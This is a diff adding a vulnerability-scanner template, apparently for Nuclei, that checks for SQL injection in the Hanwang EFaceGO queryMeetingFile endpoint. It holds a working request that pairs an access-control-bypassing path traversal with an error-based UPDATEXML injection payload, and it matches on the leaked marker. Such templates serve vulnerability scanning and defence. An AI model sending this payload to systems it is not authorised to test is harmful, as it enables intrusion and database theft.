@@ -1,0 +1,25 @@
+id: hanwangE-queryMeetingFile-sql
+
+info:
+  name: 汉王EFaceGO queryMeetingFile SQL注入漏洞
+  author: hanwangE
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        GET /manage/intercom/..;/..;/manage/meeting/queryMeetingFile.do?page=1&pageSize=10&mtId=1&order=(UPDATEXML(2920,CONCAT(0x2e,0x71716a7071,(SELECT+(ELT(2920=2920,1))),0x71706b7671),8357)) HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'qqjpq1qpkvq'
+          - 'XPATH syntax error:'
+        condition: and
+      - type: status
+        status: 
+          - 200
